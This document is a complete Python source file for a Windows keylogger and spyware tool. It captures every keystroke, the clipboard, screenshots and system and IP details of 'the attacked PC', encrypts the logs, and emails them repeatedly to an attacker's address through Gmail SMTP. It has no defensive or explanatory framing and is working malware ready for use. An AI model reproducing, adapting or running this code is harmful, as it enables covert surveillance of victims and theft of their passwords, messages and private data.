# Importing necessary libraries and packages
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from cryptography.fernet import Fernet
import getpass
from requests import get
from PIL import ImageGrab

# Assigning filenames
keys_information = "key_log.txt"
system_info = "sysinfo.txt"
clipboard_info = "clipboard.txt"
screenshot_info = "screenshot.png"
keys_info_e = "e_key_log.txt"
system_info_e = "e_sysinfo.txt"
clipboard_info_e = "e_clipboard.txt"

# Adjusting the number of iterations of the keylogger
num_end = 3

# Email credentials
email_address = [EMAIL]
password = [PASSWORD]
toaddr = [EMAIL]
key = "kTAotfoE8tgZ10a-0jqtPtZ0QJ4zjWBB06fzvrLRms4="

# Assigning a variable for the common filepath
file_path = "C:\\Windows\\Temp"
extend = "\\"
file_merge = file_path + extend

with open(file_path + extend + keys_information, "a") as f:
    f.write("Here are the required messages : \n")

# Function to send email
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = 'Log File'
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    with open(attachment, 'rb') as attachment_file:
        p = MIMEBase('application', 'octet-stream')
        p.set_payload(attachment_file.read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename=%s" % filename)
        msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.connect('smtp.gmail.com', 587)
    status_code, response = s.ehlo()
    print(response)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

# Function to get computer info
def computer_info():
    with open(file_path + extend + system_info, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        except:
            f.write("Couldn't get Public IP Address (most likely max query)\n")
        f.write("Processor: " + (platform.processor() + '\n'))
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")
        
computer_info()
send_email(system_info, file_path + extend + system_info, toaddr)

# Function to get clipboard info
def copy_clipboard():
    with open(file_path + extend + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data:\n" + pasted_data + "\n")
        except:
            f.write("Clipboard could not be copied\n")

# Function to get screenshot of the attacked PC
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_info)

# Keylogger loop to capture keystrokes and handle stopping time
num = 0
while num <= num_end:
    count = 0
    keys = []
    currentTime = time.time()
    stoppingTime = currentTime + 20  # 15 seconds

    # Function to handle key press events
    def on_press(key):
        global keys, count, currentTime
        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()
        if count >= 1:
            count = 0
            write_files(keys)
            keys = []

    # Function to write keys to the log file
    def write_files(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)

    # Function to handle key release events
    def on_release(key):
        if key == Key.esc or currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    # Function calls
    screenshot()
    copy_clipboard()

    # Sending the appropriate emails
    send_email(keys_information, file_path + extend + keys_information, toaddr)
    send_email(screenshot_info, file_path + extend + screenshot_info, toaddr)
    send_email(clipboard_info, file_path + extend + clipboard_info, toaddr)

    # Clear the log file after logging
    with open(file_path + extend + keys_information, "w") as f:
        f.write(" ")

    num += 1

    # Encrypt collected data files and send via email
    files_to_encrypt = [file_merge + system_info, file_merge + clipboard_info, file_merge + keys_information]
    encrypted_file_names = [file_merge + system_info_e, file_merge + clipboard_info_e, file_merge + keys_info_e]

    count = 0
    fernet = Fernet(key)
    for encrypting_file in files_to_encrypt:
        with open(encrypting_file, 'rb') as f:
            data = f.read()
        encrypted = fernet.encrypt(data)
        with open(encrypted_file_names[count], 'wb') as f:
            f.write(encrypted)
        send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
        count += 1

    time.sleep(30)
